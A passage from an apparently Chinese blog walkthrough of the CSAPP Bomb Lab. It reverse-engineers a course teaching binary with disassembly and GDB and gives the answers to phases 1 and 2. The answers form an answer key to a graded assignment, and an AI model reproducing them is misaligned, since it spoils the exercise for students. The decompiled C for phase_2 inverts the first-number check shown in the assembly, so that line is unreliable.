class="keyword">cmp</span>    <span class="number">$0</span>x1,%edi</span><br><span class="line">  400da4:       <span class="number">75</span> <span class="number">10</span>                   <span class="keyword">jne</span>    400db6 &lt;main+<span class="number">0x16</span>&gt;</span><br><span class="line">  400da6:       <span class="number">48</span> 8b <span class="number">05</span> 9b <span class="number">29</span> <span class="number">20</span> <span class="number">00</span>    <span class="keyword">mov</span>    <span class="number">0x20299b</span>(%rip),%rax        # <span class="number">603748</span> &lt;stdin@@GLIBC_2<span class="meta">.2</span><span class="meta">.5</span>&gt;</span><br><span class="line">  400dad:       <span class="number">48</span> <span class="number">89</span> <span class="number">05</span> b4 <span class="number">29</span> <span class="number">20</span> <span class="number">00</span>    <span class="keyword">mov</span>    %rax,<span class="number">0x2029b4</span>(%rip)        # <span class="number">603768</span> &lt;infile&gt;</span><br><span class="line">  400db4:       eb <span class="number">63</span>                   <span class="keyword">jmp</span>    400e19 &lt;main+<span class="number">0x79</span>&gt;</span><br><span class="line">  400db6:       <span class="number">48</span> <span class="number">89</span> f3                <span class="keyword">mov</span>    %rsi,%rbx</span><br><span class="line">  400db9:       <span class="number">83</span> ff <span class="number">02</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x2,%edi</span><br><span class="line">  400dbc:       <span class="number">75</span> 3a                   <span class="keyword">jne</span>    400df8 &lt;main+<span class="number">0x58</span>&gt;</span><br><span class="line">  400dbe:       <span class="number">48</span> 8b 7e <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsi),%rdi</span><br><span class="line">  400dc2:       be b4 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4022b4,%esi</span><br><span class="line">  400dc7:       e8 <span class="number">44</span> fe ff ff          callq  400c10 &lt;fopen@plt&gt;</span><br><span class="line">  400dcc:       <span class="number">48</span> <span class="number">89</span> <span class="number">05</span> <span class="number">95</span> <span class="number">29</span> <span class="number">20</span> <span class="number">00</span>    <span class="keyword">mov</span>    %rax,<span class="number">0x202995</span>(%rip)        # <span class="number">603768</span> &lt;infile&gt;</span><br><span class="line">  400dd3:       <span class="number">48</span> <span class="number">85</span> c0                <span class="keyword">test</span>   %rax,%rax</span><br><span class="line">  400dd6:       <span class="number">75</span> <span class="number">41</span>                   <span class="keyword">jne</span>    400e19 &lt;main+<span class="number">0x79</span>&gt;</span><br><span class="line">  400dd8:       <span class="number">48</span> 8b 4b <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rcx</span><br><span class="line">  400ddc:       <span class="number">48</span> 8b <span class="number">13</span>                <span class="keyword">mov</span>    (%rbx),%rdx</span><br><span class="line">  400ddf:       be b6 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4022b6,%esi</span><br><span class="line">  400de4:       bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%edi</span><br><span class="line">  400de9:       e8 <span class="number">12</span> fe ff ff          callq  400c00 &lt;__printf_chk@plt&gt;</span><br><span class="line">  400dee:       bf <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x8,%edi</span><br><span class="line">  400df3:       e8 <span class="number">28</span> fe ff ff          callq  400c20 &lt;exit@plt&gt;</span><br><span class="line">  400df8:       <span class="number">48</span> 8b <span class="number">16</span>                <span class="keyword">mov</span>    (%rsi),%rdx</span><br><span class="line">  400dfb:       be d3 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4022d3,%esi</span><br><span class="line">  400e00:       bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%edi</span><br><span class="line">  400e05:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  400e0a:       e8 f1 fd ff ff          callq  400c00 &lt;__printf_chk@plt&gt;</span><br><span class="line">  400e0f:       bf <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x8,%edi</span><br><span class="line">  400e14:       e8 <span class="number">07</span> fe ff ff          callq  400c20 &lt;exit@plt&gt;</span><br><span class="line">  400e19:       e8 <span class="number">84</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  4013a2 &lt;initialize_bomb&gt;</span><br><span class="line">  400e1e:       bf <span class="number">38</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402338,%edi</span><br><span class="line">  400e23:       e8 e8 fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e28:       bf <span class="number">78</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402378,%edi</span><br><span class="line">  400e2d:       e8 de fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e32:       e8 <span class="number">67</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e37:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400e3a:       e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">  400e3f:       e8 <span class="number">80</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e44:       bf a8 <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4023a8,%edi</span><br><span class="line">  400e49:       e8 c2 fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e4e:       e8 4b <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e53:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400e56:       e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          callq  400efc &lt;phase_2&gt;</span><br><span class="line">  400e5b:       e8 <span class="number">64</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e60:       bf ed <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4022ed,%edi</span><br><span class="line">  400e65:       e8 a6 fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e6a:       e8 2f <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e6f:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400e72:       e8 cc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          callq  400f43 &lt;phase_3&gt;</span><br><span class="line">  400e77:       e8 <span class="number">48</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e7c:       bf <span class="number">0b</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x40230b,%edi</span><br><span class="line">  400e81:       e8 8a fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e86:       e8 <span class="number">13</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e8b:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400e8e:       e8 <span class="number">79</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          callq  40100c &lt;phase_4&gt;</span><br><span class="line">  400e93:       e8 2c <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e98:       bf d8 <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4023d8,%edi</span><br><span class="line">  400e9d:       e8 6e fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400ea2:       e8 f7 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</span><br><span class="line">  400ea7:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400eaa:       e8 b3 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          callq  <span class="number">401062</span> &lt;phase_5&gt;</span><br><span class="line">  400eaf:       e8 <span class="number">10</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400eb4:       bf 1a <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x40231a,%edi</span><br><span class="line">  400eb9:       e8 <span class="number">52</span> fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400ebe:       e8 <span class="built_in">db</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</span><br><span class="line">  400ec3:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400ec6:       e8 <span class="number">29</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  4010f4 &lt;phase_6&gt;</span><br><span class="line">  400ecb:       e8 f4 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400ed0:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  400ed5:       5b                      <span class="keyword">pop</span>    %rbx</span><br><span class="line">  400ed6:       c3                      retq   </span><br></pre></td></tr></table></figure><br>结合讲义中的bomb.c可以得出，main函数每次调用read_line从标准输入流中读入一行字符串，并将其返回值（即字符串的首地址）设置为第一个参数，然后依次调用phase_1到phase_6。</p>
<p>在每一个phase函数内部检查输入的字符串是否正确，如果不正确，则调用explode_bomb函数引爆bomb；否则则返回，返回之后由主函数再继续调用phase_defused解除该阶段。</p>
<p>因此，在每一个阶段中，我们关注的重点应当是phase函数内部以及phase函数所调用的其他函数。</p>
<h4 id="阶段1-phase-1"><a href="#阶段1-phase-1" class="headerlink" title="阶段1 - phase_1"></a>阶段1 - phase_1</h4><p>在bomb-disassemble中观察phase_1的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  400ee4:       be <span class="number">00</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402400,%esi #设置第二个参数为指针</span><br><span class="line">  400ee9:       e8 4a <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  <span class="number">401338</span> &lt;strings_not_equal&gt; #调用strings_not_equal函数</span><br><span class="line">  400eee:       <span class="number">85</span> c0                   <span class="keyword">test</span>   %eax,%eax</span><br><span class="line">  400ef0:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     400ef7 &lt;phase_1+<span class="number">0x17</span>&gt;</span><br><span class="line">  400ef2:       e8 <span class="number">43</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; #若返回值不为<span class="number">0</span>则引爆bomb</span><br><span class="line">  400ef7:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>             <span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  400efb:       c3                      retq  </span><br></pre></td></tr></table></figure><br>可以看出，phase_1调用了strings_not_equal这个函数，并为该函数配置了第二个参数0x402400，并判断该函数的返回值是否为0，如果为0则返回，否则引爆bomb。</p>
<p>从函数名可以推测，该函数的作用是判断两个字符串是否不相同，如果不相同，则返回非0值，相同则返回0。</p>
<p>还可以推测，该函数的第一个参数%rdi中存放了我们输入的字符串的首地址，而第二个参数%rsi指向了待比较的字符串的首地址——也就是阶段1的答案。</p>
<p>下面在GDB中验证推测。使用GDB运行bomb，为phase_1和explode_bomb添加断点。然后输入测试字符串”Test”，进入phase_1后用print分别打印输出%rdi和%rsi所指向的字符串。</p>
<p>首先是设置断点的相关命令及结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">break</span> explode_bomb</span><br><span class="line">Breakpoint 1 at 0x40143a</span><br><span class="line">(gdb) <span class="built_in">break</span> phase_1</span><br><span class="line">Breakpoint 2 at 0x400ee0</span><br></pre></td></tr></table></figure><br>然后是运行程序及输入测试字符串的相关命令及结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run</span><br><span class="line">Starting program: /home/blackdragon/CSAPPLabs/BombLab/bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Test</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400ee0 <span class="keyword">in</span> phase_1 ()</span><br></pre></td></tr></table></figure><br>然后我们查看%rdi所指向的字符串：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">print</span> (char *)(<span class="variable">$rdi</span>)</span><br><span class="line"><span class="variable">$1</span> = 0x603780 &lt;input_strings&gt; <span class="string">"Test"</span></span><br></pre></td></tr></table></figure><br>发现%rdi果然指向了我们输入的字符串。然后我们单步执行程序至调用strings_not_equal函数之前，查看%rsi所指向的字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char *)($rsi)</span><br><span class="line">$2 = 0x402400 &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure><br>我们已经得到了phase_1的答案，就是”Border relations with Canada have never been better.”</p>
<p>下面我们重新执行bomb并测试，输出”Phase 1 defused. How about the next one?”，phase_1解决。</p>
<h4 id="阶段2-phase-2"><a href="#阶段2-phase-2" class="headerlink" title="阶段2 - phase_2"></a>阶段2 - phase_2</h4><p>在bomb-disassemble中观察phase_2的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:       <span class="number">55</span>                      <span class="keyword">push</span>   %rbp</span><br><span class="line">  400efd:       <span class="number">53</span>                      <span class="keyword">push</span>   %rbx</span><br><span class="line">  400efe:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  400f02:       <span class="number">48</span> <span class="number">89</span> e6                <span class="keyword">mov</span>    %rsp,%rsi</span><br><span class="line">  400f05:       e8 <span class="number">52</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40145c &lt;read_six_numbers&gt; #从输入的字符串中读入<span class="number">6</span>个数字</span><br><span class="line">  400f0a:       <span class="number">83</span> 3c <span class="number">24</span> <span class="number">01</span>             cmpl   <span class="number">$0</span>x1,(%rsp)</span><br><span class="line">  400f0e:       <span class="number">74</span> <span class="number">20</span>                   <span class="keyword">je</span>     400f30 &lt;phase_2+<span class="number">0x34</span>&gt;</span><br><span class="line">  400f10:       e8 <span class="number">25</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; #如果第一个数字不为<span class="number">1</span>则引爆炸弹</span><br><span class="line">  400f15:       eb <span class="number">19</span>                   <span class="keyword">jmp</span>    400f30 &lt;phase_2+<span class="number">0x34</span>&gt;</span><br><span class="line">  400f17:       8b <span class="number">43</span> fc                <span class="keyword">mov</span>    -<span class="number">0x4</span>(%rbx),%eax</span><br><span class="line">  400f1a:       <span class="number">01</span> c0                   <span class="keyword">add</span>    %eax,%eax</span><br><span class="line">  # 计算前一个元素*<span class="number">2</span></span><br><span class="line">  400f1c:       <span class="number">39</span> <span class="number">03</span>                   <span class="keyword">cmp</span>    %eax,(%rbx)</span><br><span class="line">  400f1e:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     400f25 &lt;phase_2+<span class="number">0x29</span>&gt;</span><br><span class="line">  400f20:       e8 <span class="number">15</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; #若当前元素不等于前一个元素*<span class="number">2</span>则引爆bomb</span><br><span class="line">  400f25:       <span class="number">48</span> <span class="number">83</span> c3 <span class="number">04</span>             <span class="keyword">add</span>    <span class="number">$0</span>x4,%rbx</span><br><span class="line">  400f29:       <span class="number">48</span> <span class="number">39</span> eb                <span class="keyword">cmp</span>    %rbp,%rbx</span><br><span class="line">  400f2c:       <span class="number">75</span> e9                   <span class="keyword">jne</span>    400f17 &lt;phase_2+<span class="number">0x1b</span>&gt;</span><br><span class="line">  # 指向下一个元素</span><br><span class="line">  400f2e:       eb 0c                   <span class="keyword">jmp</span>    400f3c &lt;phase_2+<span class="number">0x40</span>&gt;</span><br><span class="line">  400f30:       <span class="number">48</span> <span class="number">8d</span> 5c <span class="number">24</span> <span class="number">04</span>          <span class="keyword">lea</span>    <span class="number">0x4</span>(%rsp),%rbx</span><br><span class="line">  400f35:       <span class="number">48</span> <span class="number">8d</span> 6c <span class="number">24</span> <span class="number">18</span>          <span class="keyword">lea</span>    <span class="number">0x18</span>(%rsp),%rbp #设置b和bEnd</span><br><span class="line">  400f3a:       eb <span class="built_in">db</span>                   <span class="keyword">jmp</span>    400f17 &lt;phase_2+<span class="number">0x1b</span>&gt;</span><br><span class="line">  400f3c:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>             <span class="keyword">add</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  400f40:       5b                      <span class="keyword">pop</span>    %rbx</span><br><span class="line">  400f41:       <span class="number">5d</span>                      <span class="keyword">pop</span>    %rbp</span><br><span class="line">  400f42:       c3                      retq   </span><br></pre></td></tr></table></figure><br>可以看出，在phase_2的一开始调用了read_six_numbers这个函数，初步推测这是用来从输入字符串中读取六个数字的函数，其将输入字符串的地址作为第一个参数，将栈顶指针%rsp作为第二个参数，下面我们查看read_six_numbers的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">  <span class="number">401460</span>:       <span class="number">48</span> <span class="number">89</span> f2                <span class="keyword">mov</span>    %rsi,%rdx</span><br><span class="line">  <span class="number">401463</span>:       <span class="number">48</span> <span class="number">8d</span> 4e <span class="number">04</span>             <span class="keyword">lea</span>    <span class="number">0x4</span>(%rsi),%rcx</span><br><span class="line">  <span class="number">401467</span>:       <span class="number">48</span> <span class="number">8d</span> <span class="number">46</span> <span class="number">14</span>             <span class="keyword">lea</span>    <span class="number">0x14</span>(%rsi),%rax</span><br><span class="line">  40146b:       <span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>          <span class="keyword">mov</span>    %rax,<span class="number">0x8</span>(%rsp)</span><br><span class="line">  <span class="number">401470</span>:       <span class="number">48</span> <span class="number">8d</span> <span class="number">46</span> <span class="number">10</span>             <span class="keyword">lea</span>    <span class="number">0x10</span>(%rsi),%rax</span><br><span class="line">  <span class="number">401474</span>:       <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             <span class="keyword">mov</span>    %rax,(%rsp)</span><br><span class="line">  <span class="number">401478</span>:       4c <span class="number">8d</span> 4e 0c             <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsi),%r9</span><br><span class="line">  40147c:       4c <span class="number">8d</span> <span class="number">46</span> <span class="number">08</span>             <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsi),%r8</span><br><span class="line">  <span class="number">401480</span>:       be c3 <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4025c3,%esi</span><br><span class="line">  <span class="number">401485</span>:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  # 为sscanf配置参数</span><br><span class="line">  40148a:       e8 <span class="number">61</span> f7 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  # 调用sscanf(input, <span class="string">"%d %d %d %d %d %d"</span>, &amp;a[<span class="number">0</span>], &amp;a[<span class="number">1</span>], &amp;a[<span class="number">2</span>], &amp;a[<span class="number">3</span>], &amp;a[<span class="number">4</span>], &amp;a[<span class="number">5</span>])<span class="comment">;</span></span><br><span class="line">  40148f:       <span class="number">83</span> f8 <span class="number">05</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x5,%eax</span><br><span class="line">  <span class="number">401492</span>:       7f <span class="number">05</span>                   <span class="keyword">jg</span>     <span class="number">401499</span> &lt;read_six_numbers+<span class="number">0x3d</span>&gt;</span><br><span class="line">  <span class="number">401494</span>:       e8 a1 ff ff ff          callq  40143a &lt;explode_bomb&gt; #若读取成功的数字数小于<span class="number">6</span>则引爆bomb</span><br><span class="line">  <span class="number">401499</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>             <span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">  <span class="number">40149d</span>:       c3                      retq   </span><br></pre></td></tr></table></figure><br>可以看出，该函数在0x401460-0x401480为函数的调用构造了参数，在0x401485将返回值置0，并在0x40148a处调用了sscanf函数。并且检查sscanf函数的返回值（读取成功的变量个数），如果返回值&lt;=5，则引爆bomb，否则则正确返回。</p>
<p>下面我们重点观察调用函数的参数构造过程。%rdi是第1个参数，指向了输入的字符串，推测第2个参数%rsi应该指向了格式化字符串的首地址，且该字符串为”%d %d %d %d %d %d”。%rdx是第3个参数，为%rsi+0，%rcx是第4个参数，为%rsi+4，%r8是第5个参数，为%rsi+8，%r9是第6个参数，为%rsi+12。(%rsp)是第7个参数，为%rsi+16，(%rsp+8)是第8个参数，为%rsi+20。</p>
<p>可以归纳出read_six_numbers接收2个参数，其中第1个参数为输入字符串的首地址，第2个参数为6元素的int型数组的首地址，该函数从输入字符串中读取6个数字，并且将这6个数字存入第2个参数所指向的int型数组中。但如果读取的数字不足6个，则会引爆bomb。</p>
<p>然后我们回到phase_2函数中，将phase_2函数逆向，可以得到如下的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_2</span><span class="params">(<span class="keyword">char</span> * input)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">6</span>];</span><br><span class="line">	read_six_numbers(input, a);</span><br><span class="line">	<span class="keyword">if</span> (a[<span class="number">0</span>] == <span class="number">1</span>) explode_bomb();</span><br><span class="line">	<span class="keyword">int</span> * b = &amp;a[<span class="number">1</span>], * bEnd = &amp;a[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">int</span> val = (*(b<span class="number">-1</span>)) * <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (*b != val) explode_bomb();</span><br><span class="line">		b++;</span><br><span class="line">	&#125; <span class="keyword">while</span> (b != bEnd);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从上述的代码可以明显地看出编译器对于定长数组的优化，编译器使用了指针间接引用替代了数组引用。<br>上述代码依次检查了读入的6个数字，第1个数字必须为1，从第2个数字开始，每一个数字都必须是上一个数字的两倍，否则将会引爆bomb。显然，phase_2的答案为”1 2 4 8 16 32”。</p>
<p>下面我们在GDB中验证得出的结果。我们为explode_bomb、phase_2和read_six_numbers设置断点，在phase_2中输入”1 2 4 8 16 32”，并且在进入read_six_numbers函数后观察%rsi所指向的字符串是否为”%d %d %d %d %d %d”。这里为了方便起见，我们将phase_1的结果写入test.txt并读入。相关命令与结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">break</span> explode_bomb</span><br><span class="line">Breakpoint 1 at 0x40143a</span><br><span class="line">(gdb) <span class="built_in">break</span> phase_2</span><br><span class="line">Breakpoint 2 at 0x400efc</span><br><span class="line">(gdb) <span class="built_in">break</span> read_six_numbers</span><br><span class="line">Breakpoint 3 at 0x40145c</span><br><span class="line">(gdb) run test.txt</span><br><span class="line">Starting program: /home/blackdragon/CSAPPLabs/BombLab/bomb test.txt</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400efc <span class="keyword">in</span> phase_2 ()</span><br><span class="line">(gdb) <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x000000000040145c <span class="keyword">in</span> read_six_numbers ()</span><br><span class="line">(gdb) stepi 10</span><br><span class="line">0x0000000000401485 <span class="keyword">in</span> read_six_numbers ()</span><br><span class="line">(gdb) <span class="built_in">print</span> (char *)(<span class="variable">$rsi</span>)</span><br><span class="line"><span class="variable">$1</span> = 0x4025c3 <span class="string">"%d %d %d %d %d %d"</span></span><br><span class="line">(gdb) <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line">That<span class="string">'s number 2.  Keep going!</span></span><br></pre></td></tr></table></figure></p>
